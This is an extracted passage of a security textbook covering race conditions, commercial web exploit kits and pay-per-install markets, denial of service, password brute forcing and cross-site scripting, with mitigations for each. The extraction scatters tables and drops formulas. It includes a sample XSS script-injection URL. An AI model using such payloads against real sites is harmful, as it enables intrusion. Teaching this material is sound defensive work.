sary to also remove the PDF file type from the Folder Options menu 
(Tools → Folder Options → File Types).
[Word Count: 74]

PDF conversion tools are another effective way to limit the impact 
of attacks. Administrators may choose to use tools such as the Linux 
command-line utility “pdftotext,”27 which converts a PDF file to plain 
text. While this conversion tool removes many of the useful features
[Word Count: 44]

(visual components, media files, and interactive features) of PDF files, 
administrators may prefer other conversion tools that preserve more of 
the PDF file format.
[Word Count: 24]

Race conditions result when an electronic device or process attempts 
to perform two or more operations at the same time, producing an
[Word Count: 22]

Exhibit 3-17  Disabling an Adobe PDF browser helper object and ActiveX control.
[Word Count: 12]

illegal operation. This section explains the concepts behind race con­
ditions with examples and methods for detection and prevention.
[Word Count: 19]

Race conditions are a type of vulnerability that an attacker can use 
to influence shared data, causing a program to use arbitrary data and 
allowing attackers to bypass access restrictions. Such conditions may 
cause data corruption, privilege escalation, or code execution when 
in the appropriate context. Race conditions are also known as time-
of-check and time-of-use (TOC/TOU) vulnerabilities because they 
involve changing a shared value immediately after the check phase. 
When the program uses an unsuspected value, it may execute instruc­
tions reserved for a different purpose or allow an attacker to redirect 
critical information.
[Word Count: 95]

3.1.7.1  Examples of Race Conditions  Network race conditions are com-
mon among non–Transmission Control Protocols (non-TCPs) such
[Word Count: 17]

as User Datagram Protocol (UDP). Many network communications 
suffer from these problems because the program accepts the first 
answer to questions it asks. That is, there is a short amount of time 
between when the user asks the question and when he or she receives 
a legitimate answer in situations in which an attacker can respond and 
exploit the race condition. As an example, consider the domain name 
system (DNS) answering race condition in Exhibit 3-18.
[Word Count: 76]

Race conditions can also occur when privileged applications use 
unprivileged files. As one example affecting the X windowing system, 
the local service X Font Server (xfs, which runs as root) changes the
[Word Count: 32]

DNS Answer for example.com
IP Address 192.0.32.10
[Word Count: 7]

Multiple DNS Answers
for example.com
IP Address 6.6.6.6
[Word Count: 8]

Exhibit 3-18  A domain name service (DNS) answering a race condition over the User Diagram 
Protocol (UDP).
[Word Count: 17]

Similar to shared files, race conditions can affect shared process 
memory. If a user can influence the memory, an attack can manifest in 
many ways. Suppose a thread performs the following pseudocode to 
find the function address, which it calls immediately afterward:
[Word Count: 42]

FunctionAddress = memory[pointerA]
If FunctionAddress within kernel32.dll:	
#STATEMENT1
Then:
Parameters = memory[pointerB]
Call FunctionAddress with Parameters	
#STATEMENT2
[Word Count: 17]

Race conditions are difficult to locate from a testing perspective 
because instructions can require infinitesimally small amounts of time 
based upon the high number of instructions that modern CPUs exe-
cute per second. The likelihood of two programs requesting the same
[Word Count: 41]

3.1.7.2  Detecting and Preventing Race Conditions  Since many race 
conditions require the attacker to use brute force techniques, attack­
ers exploiting race conditions may raise many anomalies and errors 
on the system. Attempting to exploit a race condition may cause 
an extended spike in CPU use or a high volume of failed requests. 
System administrators should look for signs of a high volume of fre­
quently repeated operations.
[Word Count: 68]

Race conditions are preventable, provided programmers use the 
right tools. Semaphores and mutexes (short for mutual exclusions) pro­
vide instructions that are not vulnerable to race conditions. Mutex 
instructions succeed when other instructions fail because of their 
atomic nature. Atomic instructions are single instructions that the 
CPU can execute in a single clock cycle, unlike nonatomic instruc-
tions, which execute in multiple clock cycles. Exhibit 3-19 illustrates a 
comparison between atomic and nonatomic instructions for checking 
and locking a resource A.
[Word Count: 81]

Exhibit 3-19  A comparison of nonatomic (left) and atomic (right) versions of locking a 
resource.
[Word Count: 15]

In both the nonatomic and atomic cases, the CPU is executing the 
same instructions; however, in the nonatomic case on the left, both 
Threads1 and Thread2 obtain the same lock, which should never hap­
pen. In the atomic case, the check and lock procedure is part of a single 
instruction, which prevents the race condition and allows Thread1 to 
obtain a lock and Thread2 to determine that the lock is unavailable.
[Word Count: 71]

If the operation successfully locks a resource using an atomic (or 
hardware-based) instruction, the program can proceed knowing that 
no other thread was able to lock that same resource. Using locks 
requires that calling programs release allocated locks they already 
obtained. Many mutex systems also differentiate between read and 
write locks because, as mitigation for starvation of the writers, giving 
writers higher priority than readers can benefit the program when 
there are a high number of readers.
[Word Count: 77]

3.1.7.3  Conclusion  Attackers use race condition vulnerabilities less 
than buffer overflows and other code execution vulnerabilities. They 
are less reliable and may require high volumes of traffic or activ­
ity, which are undesirable for attackers who do not wish to raise any 
alarms. Attackers use race conditions most commonly to escalate 
privileges because attackers cannot often control the desired actions 
to trigger the race condition based on otherwise untrusted data.
[Word Count: 70]

To accomplish the process of identifying vulnerable targets and deliv­
ering appropriate exploits to them, attackers frequently use tools con­
taining exploits for numerous vulnerabilities. Some tools are freely 
available, though hackers must purchase the most effective ones in 
hacking forums. After infecting users with the chosen payload, the 
tools collect statistics that allow attackers to run more targeted attacks 
and allow criminals to track metrics useful for billing clients for mali-
cious services, such as the number of installations performed.
[Word Count: 81]

Web exploit tools (or exploit kits) give attackers the ability to 
execute arbitrary code using vulnerabilities or social engineering. To 
attract visitors to the malicious websites, attackers often compromise 
other servers to append IFrame tags, which direct visitors to attack-
ers’ Web exploit tools. Upon visiting a malicious website, the exploit
[Word Count: 51]

tool attempts to launch many different exploits to execute arbitrary 
malicious code. This section describes Web exploit tools and how they 
fit into the businesses that have benefited from client-side attacks. 
Exhibit 3-20 shows how attackers use Web exploit tools to install 
malicious code on victims’ computers.
[Word Count: 47]

Most Web exploit tools are so simple that the operator needs only 
to supply the executable virus for installation. Web exploit tools usu­
ally handle hiding, exploitation, and statistics automatically. Other 
services allow an attacker to make money from running a Web exploit 
tool and to gain a large number of victims very quickly.
[Word Count: 54]

3.1.8.1  Features for Hiding  Many exploit tools hide exploits through 
encoding, obfuscation, or redirection. Exploit tools attempt to hide 
exploits to prevent both detection and analysis, which iDefense dis­
cussed in a “State of the Hack” article entitled “iDefense Explains … 
Obfuscation.”30 Exploit tools encode traffic so that the victim decodes 
it using JavaScript or VBScript. Intrusion detection systems (IDSs) 
are a defensive measure that is ineffective at detecting encodings 
because the content transferred over the network is different from the 
content that the client executes.
[Word Count: 86]

Exploit tools also use JavaScript or HTTP headers to profile 
the client and avoid sending content unless the client is vulnerable. 
Exploit tools often try to detect multiple vulnerabilities to determine 
which will be effective and if the tool should attempt multiple attacks 
against a website visitor. HTTP headers like user-agent and browser 
variables like navigator or app reveal information that gives attackers
[Word Count: 63]

Exhibit 3-20  Victims visiting a Web exploit tool, which attempts to install a virus.
[Word Count: 14]

3.1.8.2  Commercial Web Exploit Tools and Services  There are a large 
variety of commercial Web exploit tools and services available to 
install malicious code on victims’ computers. Purchase prices for 
source code for Web exploit tools vary widely from US$30 to as much 
as US$2,000. Exhibit 3-21 shows thirty different Web exploit tools, 
including prices, information about the author, and whether iDefense 
has seen attackers use the tool in the wild.
[Word Count: 71]

Other exploit services are market driven by supply and demand. 
Running an exploit tool on a server requires little computer knowl­
edge to infect victims because the only input is an executable. Market-
driven services require even less knowledge or skill. The major markets 
include selling traffic (IFrames) and selling installs (the customer sup­
plies the executable to run).
[Word Count: 59]

Pay-per-install services allow actors to buy and sell installations, 
which is the easiest way for a customer to install malicious code. Some 
examples of pay-per-install services include IFrameDollars and Loads.
cc (see Exhibit 3-22).
[Word Count: 34]

Pay-per-traffic services allow attackers to attract a large num-
ber of victims to their Web exploit tools. Attackers can then either 
install their own viruses or sell installs via the pay-per-install model. 
Examples of pay-per-traffic services include IFrame911.com and 
RoboTraff.com (see Exhibit 3-22).
[Word Count: 43]

While the examples have public websites and are generally more 
available to the public, the same pay-per-install and pay-per-traffic 
services are available privately from individuals on hacking forums. 
Attackers can also operate each part separately from these services. 
This has advantages because it limits their interaction and dependence 
on third-party services. If those services became known or otherwise
[Word Count: 58]

AD Pack
PHP
Unknown
Unknown or no author
[Word Count: 8]

Armitage
PHP
Unknown
Unknown or no author
[Word Count: 7]

eCore Exploit Pack
PHP
$590
Multiple Aliases
Unknown
[Word Count: 8]

Exploit Multipack
PHP
Unknown
Unknown or no author
[Word Count: 8]

IcePack Lite
PHP
$30
Ni0x / IDT Group
Yes
[Word Count: 9]

IcePack Platinum
PHP
$400
Ni0x / IDT Group
Yes
[Word Count: 9]

Nuklear Traffic
PHP
Unknown
Unknown or no author
[Word Count: 8]

Exhibit 3-21  Exploit kits commonly used by cyber criminals.	
Continued
[Word Count: 10]

unavailable, investigators could discover their users or otherwise dis­
rupt the business. Attackers may instead generate their own traffic to 
exploit tools using SQL injection. Attackers can inject IFrames into 
vulnerable servers. More information on these attacks is available in the 
“State of the Hack” article “iDefense Explains … SQL Injection.”31
[Word Count: 51]

Infected websites often contain multiple levels of redirection; both 
pay-per-traffic and pay-per-install business models are possible rea-
sons for the multiple redirects. The separation of work includes gen-
erating traffic, exploiting systems, and running arbitrary executables
[Word Count: 36]

Underwater Exploit Pack
PHP
$500
Underwater
Unknown
[Word Count: 7]

Unique Bundle of Exploits
PHP
$400
system
Yes
[Word Count: 8]

WebAttacker
CGI
N/A
Inet-Lux IT Group
Yes
[Word Count: 7]

WebAttacker II
PHP
$1,000
Inet-Lux IT Group
Yes
[Word Count: 8]

Exhibit 3-21 (Continued )  Exploit kits commonly used by cyber criminals.
[Word Count: 11]

Exhibit 3-22  Pay-per-traffic and pay-per-install commercial markets.
[Word Count: 7]

on the victim machine. Attackers can make money in this process by 
being proficient in any one of the steps.
[Word Count: 20]

Many exploit tools provide administration interfaces protected 
by usernames and passwords through which an attacker can obtain 
detailed information, modify the behavior of the exploit tool, or take
[Word Count: 28]

Exhibit 3-23  Statistics for the Le Fiesta exploit tool.
[Word Count: 9]

other actions. Some exploit tools utilize a database such as MySQL to 
provide permanent storage capabilities.
[Word Count: 16]

While update services are only marginally useful because of copying, 
authors of exploit tools often do lead efforts in hiding and obfuscation 
efforts. Commercial Web exploit tools have the fastest evolution, mak­
ing it difficult for researchers to determine what exploits they use.
[Word Count: 43]

3.1.8.4  Proliferation of Web Exploit Tools Despite Protections  Malicious 
actors have offered many commercial exploit tools free on hacking 
forums, and it is not clear how profitable exploit tool development is, 
given the availability of these leaked versions.
[Word Count: 38]

Some Web exploit tools contain protections to prevent copying and 
modification. The protections include the following:
[Word Count: 16]

•	 Source code obfuscation
•	 Per-domain licenses that check the local system before running
•	 Network functionality to confirm validity (license checks)
•	 An end-user license agreement (EULA)
[Word Count: 28]

Since authors write many Web exploit tools in PHP, the source 
code is available. To prevent source code from being available and 
authors from writing exploits, Web exploit tool authors commonly 
use commercial PHP obfuscation tools such as NuSphere’s NuCoder 
or Zend Guard when they distribute their source code. Some exploit 
tools like Neosploit use compiled C code to run as CGI programs, 
which require much more time to reverse engineer or modify since 
they do not preserve the original source code.
[Word Count: 82]

Attackers that use exploit tools do not always purchase tools since 
some are freely available. The commercial markets that depend on
[Word Count: 21]

exploit tools have supply-and-demand components for supporting the 
Web exploit tool use, including pay-per-traffic and pay-per-install 
models. The proliferation of Web exploit tools is one indicator that 
attackers are investing resources into this market. Commercial Web 
exploit tools often include hiding and obfuscation techniques to evade 
defensive measures.
[Word Count: 48]

Attackers using these tools collect victim trends and statistics that 
allow them to focus their efforts to be successful in the future. The 
division of traffic exploits and installs will likely continue as each 
area improves.
[Word Count: 36]

Incidents reported daily in the news are a reminder that denial of 
service (DoS) attacks are a major threat to systems connected to the 
Internet, especially those of e-commerce, financial services, and gov­
ernment services. This section explains how these attacks work and 
offers solutions to mitigate the effects of future attacks.
[Word Count: 52]

DoS is a general term to describe a lack of access to a service. The 
lack of access can occur for many reasons and at different points 
between the client and server. Points subjected to a DoS condition are 
network segments, network devices, the server, and the application 
hosting the service itself. The conditions necessary to cause a DoS 
at each of these points differ, but all result in a disruption in activity 
between the client and server.
[Word Count: 78]

A network can only send and receive a certain amount of data at 
one time. Any data sent that exceeds a network’s bandwidth will not
[Word Count: 25]

make it to its destination. One form of DoS occurs when an attacker 
sends so much traffic to the target that it consumes all of the available 
bandwidth. In this situation, most requests cannot make it to their 
intended destinations, which results in a DoS for legitimate clients. 
Exhibit 3-24 shows an attacker consuming the network bandwidth 
and denying access to other users.
[Word Count: 63]

To consume the available bandwidth of a target, an attacker uses 
a technique known as flooding. Flooding describes the overwhelm­
ing traffic used to saturate network communications. Attackers use 
communication protocols such as User Datagram Protocol (UDP), 
Internet Control Message Protocol (ICMP), and Transmission 
Control Protocol (TCP) to inundate the target with network traffic.
[Word Count: 54]

A similar method to cause a DoS condition starves the resources 
of network devices. Overutilization of system resources, such as 
central processing unit (CPU), memory, or data structures stored in 
memory, can cause system failure. System failure of a network device, 
such as a firewall, router, or switch, has devastating results because it 
causes network traffic congestion resulting in performance degrada­
tion or an outage.
[Word Count: 65]

A particularly effective DoS attack on network device resources is 
a SYN Flood. A SYN Flood describes the rapid transmission of TCP 
SYN packets to a target to initiate the three-way TCP handshake to 
create a session. The attacker initiates the TCP handshake by send-
ing SYN packets to the target but does not acknowledge the target’s 
synchronize and acknowledgment (SYN/ACK) packets. The network 
device awaits the ACK that the attacker never sends, which creates 
half-open sessions that the network device stores in a connection 
table. Eventually, the network device purges the half-open sessions
[Word Count: 94]

Exhibit 3-24  A bandwidth-consuming denial of service (DoS) attack.
[Word Count: 9]

after a timeout period, but if the attacker can fill the device’s connec­
tion table, then the device ignores all further legitimate attempts to 
create a TCP session.
[Word Count: 28]

Another option to overwhelm a target’s resources becomes available 
through amplification, which involves using techniques to magnify 
the effect of and attack beyond the capabilities of the attacker’s lim­
ited resources. The amplification helps the attacker use more resources 
than are ordinarily readily available to them. Typically accomplished 
by using a technique called reflection, the attacker spoofs the IP 
address of requests to the intermediary system, called a reflector, which 
sends responses back to the spoofed IP address. The responses to the 
spoofed IP address can flood the system at that address, which is the 
target of the attack.
[Word Count: 99]

A domain name system (DNS) amplification attack exemplifies this 
technique and takes advantage of the size difference between DNS
[Word Count: 19]

query packets and DNS answer packets. An attacker spoofs the source 
IP address within DNS query packets sent to recursive DNS servers. 
The DNS servers act as a reflector by replying with DNS answer pack­
ets to the target. The answer packets generally are many times larger 
than the initial query packet, resulting in a successful amplification 
of the attacker’s traffic. For more information on this form of attack, 
refer to the “State of the Hack” article entitled “iDefense Explains 
Domain Name System (DNS) Amplification Attacks.”
[Word Count: 86]

In addition to resource starvation, DoS conditions can occur as a 
by-product of vulnerability exploitation. A server or service suscepti­
ble to vulnerabilities, such as buffer overflows and format string over­
flows, can hang or crash in the event of a successful exploitation. Once 
crashed or in a hung state, the server or service can no longer carry out 
its responsibilities, resulting in a DoS condition.
[Word Count: 66]

Other DoS conditions stem from the configuration of a service or 
server. Not only do improper configurations present DoS opportu­
nities, but also even legitimate or proper configurations can block a 
client from interacting with a service. For example, an account lock-
out feature in Microsoft Active Directory could deny a user from 
accessing the network domain if a password brute force attack exceeds 
the configured maximum number of allowed logon attempts. The 
Conficker worm was notorious for locking out user accounts during 
its propagation when it attempted to brute force the passwords to net­
work shares.
[Word Count: 97]

The variety of different types of DoS attacks and the multiple loca-
tions where they can occur make a complete DoS prevention package
[Word Count: 23]

impractical; however, certain safeguards can reduce the chances of 
suffering from a DoS condition. Addressing DoS situations requires 
security safeguards, detection, and adequate response planning.
[Word Count: 25]

Security safeguards start with the patching of systems, which 
reduces the known vulnerabilities that can potentially cause a DoS 
through exploitation. This does not protect against zero-day and 
unknown vulnerabilities, but an up-to-date system is less likely to fall 
victim to a DoS vulnerability.
[Word Count: 44]

The common network-level safeguards using security devices can 
reduce DoS attempts by filtering out erroneous traffic at edge routers 
and firewalls. Many vendors offer DoS protection features built into 
their products. Access control lists (ACLs) and rate-limiting rules can 
immediately address DoS activity by blocking unwanted and flood­
ing traffic. Using a network device with antispoofing functionality, 
such as Unicast Reverse Path Forwarding (uRPF), can reduce net­
work DoS conditions, as the device verifies the validity of a source IP 
address and discards the traffic if the source IP address is not valid or 
is spoofed.
[Word Count: 96]

DoS detection requires monitoring of network traffic patterns and the 
health of devices. Intrusion detection or prevention systems, Netflows, 
and other network traffic logs can provide an indication of DoS condi­
tions in the event of an increase in network activity or alerts. Monitoring 
the health of devices can also detect if a DoS is underway. If a system’s 
available resources, whether they are memory, CPU utilization, and/or 
another resource, reach a critical level of utilization, then the cause of 
such exhaustion needs mitigation to avoid a DoS condition.
[Word Count: 89]

One of the most overlooked DoS prevention requirements is ade­
quate response procedures. Planning response procedures will reduce 
the impact and outage caused by a DoS. DoS protection services are 
beginning to surface, including VeriSign’s DDoS Monitoring and 
Mitigation35 services. VeriSign monitors traffic destined for its cus-
tomers’ networks for DDoS characteristics and provides mitigation by 
filtering out the DDoS traffic.
[Word Count: 61]

Response planning should also include in-house procedures on 
involving the appropriate resources to mitigate the cause of the issue. 
Administrators and service providers need to understand that their 
involvement and processes are required to stop the activity causing a 
DoS. These processes vary depending on the specific situation or attack,
[Word Count: 50]

but they range from the service provider creating upstream ACL rules 
or black holing source networks via BGP routes, to a systems adminis­
trator replacing a server with a hot spare to mitigate a DoS.
[Word Count: 35]

Every day, DoS attacks cause outages across the Internet. The 
increase of botnet prevalence and release of application vulner­
abilities make DoS incidents inevitable. DoS conditions spawn 
from everything from unintentional actions such as configuration 
changes, to intentional motives, to attacks on opposing political 
groups or competition, or they can act as a decoy for other malicious 
intentions. Regardless of the cause of the outage, careful planning 
can reduce the impact of such an outage and minimize the financial 
losses involved.
[Word Count: 81]

3.1.10  Brute Force and Dictionary Attacks
[Word Count: 6]

A password-based authentication system is only as good as its 
underlying passwords. When attackers use brute force attacks and 
dictionary attacks against these systems, these passwords may prove 
to be insufficient. In this section, we will explain these two types of 
high-level attacks commonly used against password-based authen­
tication systems.
[Word Count: 50]

Authentication systems that depend on passwords to determine 
the authenticity of a user are only as strong as the passwords on 
which they rely. Most system administrators understand this simple 
fact and require users to use sufficiently long and complex passwords. 
While this may reduce the probability of an attacker quickly guess­
ing a user’s password, the fact remains that password-only systems 
are vulnerable to two very well-known attacks: brute force attacks 
and dictionary attacks.
[Word Count: 75]

Attackers can and have used brute force attacks and dictionary 
attacks against a variety of cryptographic and authentication sys-
tems. It is space prohibitive to explain how these attacks work against 
the wide variety of cryptographic and authentication systems. This 
article focuses primarily on the attacks as they pertain to the generic 
model of a password- or passphrase-based authentication system. This 
generic authentication system uses some form of text-based password 
or passphrase string in combination with a username or some other 
form of identifier to authenticate the identity of the user. The use of a
[Word Count: 95]

text-based password allows the authentication system to compare the 
supplied text against the value previously set for the given username.
[Word Count: 20]

Users, generally speaking, default to the simplest passwords they 
can use that still conform to the password standards set by the system 
administrators. As a result, the majority of users select a password 
based on a common word or phrase that the user can remember or 
that has some significant meaning to the user. Attackers capitalize on 
this fact by using password dictionaries.
[Word Count: 63]

Password dictionaries, sometimes referred to as word lists,36 are 
compilations of known words and known variations on these words 
that users may use as passwords. These variations can include charac­
ter substitutions (e.g., changing 1’s to i’s or l’s and vice versa), inter­
jecting words from nonnative languages, and combining words into 
phrases. These password dictionaries are typically flat-text files with 
one password per line. Attacks can apply these passwords in a system­
atic way to the authentication system using a known username to find 
the correct password associated with the username.
[Word Count: 92]

When dealing with authentication systems that allow largely lan-
guage-based passwords (passwords that conform to a given spoken 
language, such as English, French, or Russian, and do not contain a 
significantly high number of nonalphanumeric characters), a suitably 
large password dictionary can have a high degree of success against 
common passwords.
[Word Count: 51]

Dictionary attacks, like most attacks against unknown password-
based authentication systems, can be slow when attempting to probe 
the authentication system one password at a time. When an attacker 
accesses the authentication system in question over the Internet,
[Word Count: 38]

For any given user, there is no guarantee that the dictionary will 
contain the password. When the user selects a suitably random pass­
word, such as @fA09wR&$xZQ, the probability of a dictionary con­
taining such an entry is exceedingly slim. That said, and as mentioned 
previously, it is rare for a typical user to use such a random password 
because such passwords are difficult to remember. When an attacker 
has compromised the username and password database, and when the 
attacker has suitable hard drive space, an attacker can make a time–
space trade-off using rainbow tables.
[Word Count: 96]

Brute force attacks work on the principle that, given enough time, an 
attacker can find any password regardless of its length or complexity.
[Word Count: 23]

Brute force attacks against password-based authentication systems 
require the attacker to establish the set of letters, numbers, and sym­
bols (known as the character space or key space) that are permissible for 
any password. The smaller the valid character set, the less time it will 
take to complete a brute force attack.
[Word Count: 52]

1
13
.
114
2
14
.
121
3
21
44
122
4
22
111
.
11
23
112
.
12
24
113
(and so on)
[Word Count: 26]

Exhibit 3-25  The brute force generation of passwords for the character set 1–4.
[Word Count: 13]

second part of Exhibit 3-26 depicts the generalized mathematical for­
mula for determining the maximum amount of time required to brute 
force a password of a given length.
[Word Count: 28]

3.1.10.1  Attack  To clearly illustrate the amount of time required to 
brute force a password of sufficient complexity, given a character set 
defined as abcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*(), 
which has a character set size of forty-six characters and a maxi­
mum password length of eight characters, the maximum number of 
iterations required to fully exhaust the character set for the password 
length would be roughly 20 quadrillion iterations, or:
[Word Count: 66]

If the authentication system took one-half of a second per password 
supplied to indicate the validity of a password and if the password 
was “))))))))”, it would take the attacker roughly 10 quadrillion seconds 
to find the password. Ten quadrillion seconds is the equivalent of 
317,852.8 years. Such a long time renders the password “unbreakable” 
since the length of the attack outlasts the usefulness of the informa­
tion under attack.
[Word Count: 70]

On the other hand, if the number of iterations per second was sig-
nificantly higher as would typically be the case in an offline attack, 
the same password may no longer be unbreakable. For instance, using 
a tool such as John the Ripper40 on a 2 GHz Xeon virtual machine 
image, it is possible to brute force 5,000 passwords per second. Using 
the same character set and password length as defined previously, it
[Word Count: 73]

where c is the character set size and l is the maximum length 
of the password
[Word Count: 16]

where t is the time (in seconds) to perform a single password 
validity test
[Word Count: 14]

Exhibit 3-26  Formulas to determine the maximum size and time required for a brute force 
attack.
[Word Count: 16]

A variety of tools are available on the Internet that perform brute 
force, dictionary, and rainbow table attacks. Exhibit 3-27 identifies 
some common tools and the types of attacks they perform.
[Word Count: 31]

When attempting to brute force a password, it is extremely impor-
tant to reduce the time required per iteration to make the attack effec-
tive. For this reason, offline attacks against username and password
[Word Count: 34]

passcracking.com
MD5 Hashes
Yes
Yes
No
Offline
[Word Count: 7]

Exhibit 3-27  Common password attack tools.
[Word Count: 6]

databases are more suitable for brute force attacks than using a live 
authentication system, since many authentication systems purposely 
introduce delays.
[Word Count: 21]

Brute force attacks against live systems are clumsy and time con­
suming. Authentication systems can further hamper their effectiveness 
by introducing delays between authentication attempts. The higher 
the delay, the more time it will take to find a successful password.
[Word Count: 40]

When an attacker performs an attack against a live authentication 
system, the authentication system should restrict the number of logon 
attempts by a single user in a short period. Typically, system admin­
istrators use a threshold value of six or fewer logon attempts within 
10–30 minutes before locking an account. This allows legitimate users 
the luxury of mistyping their password a few times but prevents dic­
tionary and brute force attacks from rapidly trying passwords to com­
promise an account.
[Word Count: 80]

The system administrators design the complexity requirements for 
passwords to frustrate both dictionary and brute force attacks. By 
increasing the character space to include nonalphabetic characters 
and requiring passwords to be at least six characters long, administra­
tors exponentially increase the amount of time required to brute force 
a password. Exhibit 3-28 compares the various size and complexity 
versus the maximum brute force iteration requirements. These same 
complexities can hamper the effectiveness of a password dictionary by 
moving the valid password design to a more random or complex word 
structure that may not typically exist in a password dictionary.
[Word Count: 99]

When an attacker obtains a username and password database, the 
only defense a system administrator has against an offline dictionary 
or brute-forcing attack is the complexity of the password construction. 
It is important that system administrators enforce sufficient password 
construction complexity rules. To prevent successful rainbow table 
attacks against an offline database, authentication system designers 
use salt values.
[Word Count: 58]

Salts are random characters added to the beginning of a supplied 
text password prior to the hash generation. By using a salt value, 
authentication systems can store the same password multiple times in 
a username and password database with different hash values for each 
user and salt. The salt is typically a multibyte value that is stored in the 
username and password data in plaintext for the authentication system
[Word Count: 69]

to hash the supplied password properly for comparison. The use of the 
salt increases the size of the possible password length exponentially, 
resulting in a significantly higher space requirement for rainbow tables. 
For instance, using an 8-byte salt would increase the size requirements 
for a rainbow table by 264 (18,446,744,073,709,551,616) times; how­
ever, the salt has little effect on dictionary and brute force attacks since 
the salt is typically available in the username and password database, 
therefore allowing the attacker to add the value as a static string.
[Word Count: 88]

3.2  Misdirection, Reconnaissance, and Disruption Methods
[Word Count: 6]

Improper input validation can allow an attacker to execute malicious 
scripts on Web pages with the same level of access as legitimately
[Word Count: 22]

abcdefghijklmnopqrstuvwxyz
8
208,827,064,576
[Word Count: 3]

abcdefghijklmnopqrstuvwxyz0123456789
6
2,176,782,336
[Word Count: 3]

abcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()
5
205,962,976
[Word Count: 3]

abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNO
PQRSTUVWXYZ0123456789!@#$%^&*()
[Word Count: 2]

abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNO
PQRSTUVWXYZ0123456789!@#$%^&*()
[Word Count: 2]

abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNO
PQRSTUVWXYZ0123456789!@#$%^&*()
[Word Count: 2]

Exhibit 3-28  Maximum brute force iterations for various character sets and password lengths.
[Word Count: 13]

included scripts. Used to access form variables and take actions on 
behalf of the user, cross-site scripting (XSS) attacks are the most 
commonly present and widely exploited type of vulnerability.
[Word Count: 30]

As the popularity of Web applications has grown in recent years, 
reports of one Web-based programming error, the XSS vulnerabil­
ity, has grown in kind. In 2008, the National Vulnerability Database 
(NVD) recorded 806 XSS flaws, accounting for more than 14 percent 
of all new vulnerabilities.41 The website xssed.com tracks thousands 
of XSS errors, many of which remain unfixed for months or years.42 
Despite its prevalence, many users and programmers do not under­
stand how XSS attacks work or how to defend against them.
[Word Count: 84]

All major Web browsers now implement the same-origin policy, 
and while it is effective, Web programmers can still leave their appli-
cations open to this type of attack through sloppy coding. The term 
XSS now refers to attacks that attempt to sidestep the same-origin
[Word Count: 44]

Exhibit 3-29  Prior to the same-origin policy, one website could alter another when loaded in the 
same browser.
[Word Count: 18]

policy by causing malicious script code to run within the context of 
the original site and therefore with the “same origin.”
[Word Count: 21]

Like many common vulnerabilities, XSS flaws are essentially input 
validation errors. For an XSS attack to occur, a website must accept 
input from an untrusted source, such as a Web request, and serve the 
submitted input on a Web page. The infected page may be served to 
the same user, such as in the case of a search engine, or to any user, 
such as in the case of a blog’s comment form. If the website fails to 
sanitize the input, the browser will execute the malicious script.
[Word Count: 88]

For example, a search engine must accept input from visitors to 
determine what the user is looking for. This information is often 
passed to the Web application through a URL parameter. URL 
parameters are key–value pairs appended to the end of a URL that 
the Web application can use to generate dynamic content. In the fol­
lowing example, the “query” variable is set to the value puppies.
[Word Count: 67]

The search engine takes this value, searches its database for pages 
containing the word puppies, and returns a result page like that shown 
in Exhibit 3-30. If the search engine does not properly sanitize the 
user’s input before displaying it, that input could alter the page in 
ways the developer did not intend. Rather than inputting a real 
search query, a user might enter JavaScript code that causes the page 
to show an alert that the query returns (e.g., http://example.com/
search?query= ><SCRIPT>alert(“XSS!”)</SCRIPT><).
[Word Count: 82]

http://example1.com/search?query=puppies
[Word Count: 1]

Puppies, Cute Puppy Names, Pictures of Puppies & More | Daily Puppy
Find cute puppy pictures and videos. Learn how to care for and train puppies. Submit
your puppy to be the daily puppy, create proﬁles for you and your dogs ...
Pupfolio - Dogs - Dog Forums - Gucci the Bernese Mountain Dog
www.dailypuppy.com/ - Cached - Similar
[Word Count: 59]

Puppies for Sale, Dogs for Sale and Dog Breeders
Directory of dog breeds and breeders with puppies for sale and dogs for adoption, Find
the right breed, and the perfect puppy at PuppyFind.com.
Member Login - Find a Puppy - Pomeranian - Great Dane
www.puppyﬁnd.com/ - Cached - Similar
[Word Count: 49]

Puppies for Sale, Dogs for Sale
Mar 24, 2010 ... AKC dogs for sale, AKC puppies for sale from area dog breeders. Find a
puppy for sale, dogs for sale at Next Day Pets.
[Word Count: 34]

Exhibit 3-30  A search engine displays the result of a user’s query.
[Word Count: 12]

The vulnerable search engine queries for the malicious string and 
then returns it to the user along with the results. Rather than display­
ing the query text to the user, the browser generates an alert box con­
taining the text “XSS!” demonstrating that code passed by the URL 
was executed (see Exhibit 3-31).
[Word Count: 53]

At first glance, this vulnerability does not appear to be very dan­
gerous, as the user entered the text that caused the code to execute; 
however, attackers often craft malicious links containing the mali­
cious script code, distribute these malicious links via e-mail, or post 
them to message boards and simply wait for users to click them.
[Word Count: 57]

XSS attacks such as the one described above are known as nonper-
sistent, reflected, or Type-1 attacks because they only alter the page 
once, when the victim visits the specially crafted URL. Persistent XSS 
vulnerabilities are less common but much more dangerous. When 
attackers exploit a persistent XSS vulnerability, they make changes to
[Word Count: 53]

http://example1.com/search?query=><SCRIPT>alert
[Word Count: 1]

Exhibit 3-31  A vulnerable site executes JavaScript code rather than displaying the query.
[Word Count: 13]

the page content that are stored in a database, which then affects every 
subsequent user who visits the page.
[Word Count: 19]

Many Web applications allow users to submit content that is stored 
in a database and later displayed to other users. For instance, the com­
ment section of a blog application takes all comments and stores them 
in a database table associated with the blog entry. The application then 
selects these comments from the database and displays them when 
a visitor views the associated blog entry. If the application does not 
properly sanitize these entries, each subsequent visitor will execute the 
attacker’s code in his or her browser.
[Word Count: 87]

Persistent XSS flaws are very similar to another input validation 
error, SQL injection,45 in that both vulnerabilities allow the attacker 
to make persistent changes to a Web application and are predicated on 
improper input validation. One possible outcome of XSS is a type of 
Web worm that infects a user’s Web pages (such as profiles or social-
networking pages) instead of his or her computer.
[Word Count: 65]

Users can mitigate the threat from XSS attacks by using mod-
ern browsers with XSS filter technologies. Internet Explorer (IE) 8 
includes a filter that prevents reflected XSS attacks when it detects 
them. IE users who cannot upgrade should make use of security zones 
to prevent scripts from nontrusted websites from running.
[Word Count: 52]

Firefox users can install the no-script plug-in, which also contains 
an XSS filter. No-script also allows the user to specify which sites they 
trust to run JavaScript code but denies nontrusted sites by default.
[Word Count: 34]

Web application developers should be careful to ensure their 
programs are not vulnerable to XSS attacks. The key to prevent­
ing XSS is treating all users’ input as suspicious and sanitizing it 
before returning it with other dynamic content; however, this task is 
more difficult than it appears. The Open Web Application Security 
Project (OWASP) has created a cheat sheet that shows the many 
ways malicious actors can launch XSS attacks and how to defend 
against them.47
